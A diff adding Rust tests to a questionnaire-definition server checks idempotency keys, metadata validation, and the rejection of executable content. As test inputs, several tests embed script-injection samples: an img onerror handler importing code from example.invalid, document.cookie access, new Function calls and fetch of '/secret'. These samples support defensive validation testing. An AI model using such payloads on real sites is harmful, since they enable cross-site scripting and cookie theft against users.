@@ -37,6 +37,79 @@ fn ids() -> (Uuid, Uuid) {
 }
 
 #[tokio::test]
+async fn a_commit_requires_a_nonempty_bounded_idempotency_key() {
+    let (project_id, _) = ids();
+    for key in [
+        None,
+        Some("".to_owned()),
+        Some(" \t ".to_owned()),
+        Some("x".repeat(129)),
+    ] {
+        let result = QuestionnaireDefinition::new(FakeAccess::default())
+            .apply(ApplyInput {
+                project_id,
+                definition: minimal_definition().to_string(),
+                commit: true,
+                idempotency_key: key,
+            })
+            .await
+            .unwrap();
+        assert!(!result.committed);
+        assert!(result
+            .diagnostics
+            .iter()
+            .any(|d| d.code == "IDEMPOTENCY_KEY_REQUIRED" && d.path == "/idempotencyKey"));
+    }
+}
+
+#[tokio::test]
+async fn invalid_questionnaire_metadata_is_rejected_equally_before_inspection_and_commit() {
+    let (project_id, _) = ids();
+    for (field, value, code) in [
+        ("name", "   ".to_owned(), "QDEF_NAME_INVALID"),
+        ("name", "x".repeat(256), "QDEF_NAME_INVALID"),
+        ("version", "1.2".to_owned(), "QDEF_VERSION_UNSUPPORTED"),
+        (
+            "version",
+            "1.0.0-beta.1".to_owned(),
+            "QDEF_VERSION_UNSUPPORTED",
+        ),
+        (
+            "version",
+            "2147483648.0.0".to_owned(),
+            "QDEF_VERSION_UNSUPPORTED",
+        ),
+    ] {
+        let mut definition = minimal_definition();
+        definition["questionnaire"][field] = json!(value);
+        let mut inspection = None;
+        for commit in [false, true] {
+            let result = QuestionnaireDefinition::new(FakeAccess::default())
+                .apply(ApplyInput {
+                    project_id,
+                    definition: definition.to_string(),
+                    commit,
+                    idempotency_key: Some("invalid-metadata".into()),
+                })
+                .await
+                .unwrap();
+            assert!(!result.valid, "invalid {field} accepted: {value}");
+            assert!(!result.committed);
+            assert!(result.digest.is_none());
+            assert!(result
+                .diagnostics
+                .iter()
+                .any(|d| d.code == code && d.path == format!("/questionnaire/{field}")));
+            let diagnostics = serde_json::to_value(&result.diagnostics).unwrap();
+            if let Some(expected) = &inspection {
+                assert_eq!(&diagnostics, expected);
+            }
+            inspection = Some(diagnostics);
+        }
+    }
+}
+
+#[tokio::test]
 async fn text_only_qdef_round_trips_through_the_questionnaire_definition_interface() {
     let stored = StoredQuestionnaire {
         name: "Welcome study".into(),
@@ -128,6 +201,7 @@ async fn text_only_qdef_round_trips_through_the_questionnaire_definition_interfa
             project_id,
             definition: exported.canonical.clone(),
             commit: false,
+            idempotency_key: None,
         })
         .await
         .expect("definition inspection should be authorized");
@@ -221,6 +295,7 @@ async fn unsupported_qdef_versions_return_stable_structured_diagnostics() {
             })
             .to_string(),
             commit: false,
+            idempotency_key: None,
         })
         .await
         .expect("definition inspection should be authorized");
@@ -245,6 +320,7 @@ async fn malformed_json_is_reported_by_the_questionnaire_definition_interface() 
             project_id,
             definition: "{ definitely not JSON".into(),
             commit: false,
+            idempotency_key: None,
         })
         .await
         .expect("definition inspection should be authorized");
@@ -269,6 +345,7 @@ async fn duplicate_raw_json_registry_keys_are_rejected_before_deserialization() 
             }"#
             .into(),
             commit: false,
+            idempotency_key: None,
         })
         .await
         .expect("definition inspection should be authorized");
@@ -424,6 +501,7 @@ async fn executable_payloads_are_rejected_at_the_inspection_boundary() {
                 project_id,
                 definition: document.to_string(),
                 commit: false,
+                idempotency_key: None,
             })
             .await
             .unwrap();
@@ -437,6 +515,129 @@ async fn executable_payloads_are_rejected_at_the_inspection_boundary() {
             "missing diagnostic at {expected_path}: {:?}",
             result.diagnostics
         );
+    }
+}
+
+#[tokio::test]
+async fn unsafe_content_has_the_same_actionable_findings_for_inspection_and_commit() {
+    let (project_id, _) = ids();
+    let mut document = minimal_definition();
+    document["settings"]["global_scripts"] = json!(["window.location = 'https://example.invalid'"]);
+    document["questions"]["copy"]["display"]["content"] =
+        json!("<img src=x onerror='import(\"https://example.invalid/code.js\")'>");
+
+    let mut inspected = None;
+    for commit in [false, true] {
+        let result = QuestionnaireDefinition::new(FakeAccess::default())
+            .apply(ApplyInput {
+                project_id,
+                definition: document.to_string(),
+                commit,
+                idempotency_key: None,
+            })
+            .await
+            .unwrap();
+        assert!(!result.valid);
+        assert!(!result.committed);
+        assert!(result.canonical.is_none());
+        assert!(result.digest.is_none());
+        for path in [
+            "/settings/global_scripts",
+            "/questions/copy/display/content",
+        ] {
+            let finding = result
+                .diagnostics
+                .iter()
+                .find(|d| d.path == path)
+                .unwrap_or_else(|| panic!("missing finding for {path}: {:?}", result.diagnostics));
+            assert_eq!(finding.code, "UNSAFE_EXECUTABLE");
+            assert_eq!(
+                finding.severity,
+                qdesigner_server::questionnaire_definition::DiagnosticSeverity::Error
+            );
+            assert!(!finding.message.is_empty());
+            assert!(finding.hint.as_ref().is_some_and(|hint| !hint.is_empty()));
+        }
+        if let Some(expected) = &inspected {
+            assert_eq!(&result.diagnostics, expected);
+        } else {
+            inspected = Some(result.diagnostics);
+        }
+    }
+}
+
+#[tokio::test]
+async fn executable_aliases_cannot_hide_in_nested_module_configuration() {
+    let (project_id, _) = ids();
+    for (field, value) in [
+        (
+            "onClick",
+            json!("import('https://example.invalid/plugin.js')"),
+        ),
+        ("ON_submit", json!("new Function('return window')()")),
+        (
+            "custom_function",
+            json!({"body": "globalThis.document.cookie"}),
+        ),
+        ("global_script", json!("window.fetch('/api/private')")),
+        ("javaScript", json!("document.location")),
+        ("language", json!(" JavaScript ")),
+        ("language", json!("text/javascript; charset=utf-8")),
+    ] {
+        let mut document = minimal_definition();
+        document["questions"]["copy"]["config"] = json!({ "nested": { field: value } });
+        let result = QuestionnaireDefinition::new(FakeAccess::default())
+            .apply(ApplyInput {
+                project_id,
+                definition: document.to_string(),
+                commit: false,
+                idempotency_key: None,
+            })
+            .await
+            .unwrap();
+        let path = format!("/questions/copy/config/nested/{field}");
+        assert!(!result.valid, "accepted executable alias {field}");
+        assert!(
+            result
+                .diagnostics
+                .iter()
+                .any(|d| d.code == "UNSAFE_EXECUTABLE" && d.path == path),
+            "missing executable diagnostic for {path}: {:?}",
+            result.diagnostics
+        );
+    }
+}
+
+#[tokio::test]
+async fn stable_question_identifiers_are_data_not_executable_field_names() {
+    let (project_id, _) = ids();
+    for id in ["script", "hooks", "onClick", "global_scripts"] {
+        let mut document = minimal_definition();
+        let question = document["questions"]
+            .as_object_mut()
+            .unwrap()
+            .remove("copy")
+            .unwrap();
+        document["questions"][id] = question;
+        document["structure"]["pages"][0]["blocks"][0]["questionIds"] = json!([id]);
+        let result = QuestionnaireDefinition::new(FakeAccess::default())
+            .apply(ApplyInput {
+                project_id,
+                definition: document.to_string(),
+                commit: false,
+                idempotency_key: None,
+            })
+            .await
+            .unwrap();
+        assert!(
+            result.valid,
+            "safe question ID {id} rejected: {:?}",
+            result.diagnostics
+        );
+        let exported: serde_json::Value =
+            serde_json::from_str(result.canonical.as_ref().unwrap()).unwrap();
+        assert_eq!(exported["questions"], document["questions"]);
+        assert_eq!(exported["structure"], document["structure"]);
     }
 }
 
@@ -462,6 +663,7 @@ async fn unsupported_tracer_capabilities_do_not_receive_a_valid_digest() {
                 project_id,
                 definition: document.to_string(),
                 commit: false,
+                idempotency_key: None,
             })
             .await
             .unwrap();
@@ -485,6 +687,7 @@ async fn passive_html_and_literal_script_discussion_remain_portable_text() {
             project_id,
             definition: document.to_string(),
             commit: false,
+            idempotency_key: None,
         })
         .await
         .unwrap();
@@ -492,6 +695,48 @@ async fn passive_html_and_literal_script_discussion_remain_portable_text() {
     let canonical: serde_json::Value =
         serde_json::from_str(result.canonical.as_ref().unwrap()).unwrap();
     assert_eq!(canonical["questions"], document["questions"]);
+}
+
+#[tokio::test]
+async fn javascript_language_markers_and_executable_ast_nodes_are_not_opaque_config() {
+    let (project_id, _) = ids();
+    for (expression, path) in [
+        (
+            json!({"type": "javascript", "source": "globalThis.fetch('/secret')"}),
+            "/questions/copy/config/expression/type",
+        ),
+        (
+            json!({"dialect": "application/javascript", "source": "import('/module')"}),
+            "/questions/copy/config/expression/dialect",
+        ),
+        (
+            json!({"type": "ImportExpression", "source": {"type": "Literal", "value": "/module"}}),
+            "/questions/copy/config/expression/type",
+        ),
+        (
+            json!({"type": "NewExpression", "callee": {"type": "Identifier", "name": "Function"}, "arguments": []}),
+            "/questions/copy/config/expression/type",
+        ),
+    ] {
+        let mut definition = minimal_definition();
+        definition["questions"]["copy"]["config"] = json!({"expression": expression});
+        for commit in [false, true] {
+            let result = QuestionnaireDefinition::new(FakeAccess::default())
+                .apply(ApplyInput {
+                    project_id,
+                    definition: definition.to_string(),
+                    commit,
+                    idempotency_key: Some("unsafe-ast".into()),
+                })
+                .await
+                .unwrap();
+            assert!(!result.valid, "Executable model was accepted: {expression}");
+            assert!(result
+                .diagnostics
+                .iter()
+                .any(|d| d.code == "UNSAFE_EXECUTABLE" && d.path == path));
+        }
+    }
 }
 
 #[tokio::test]
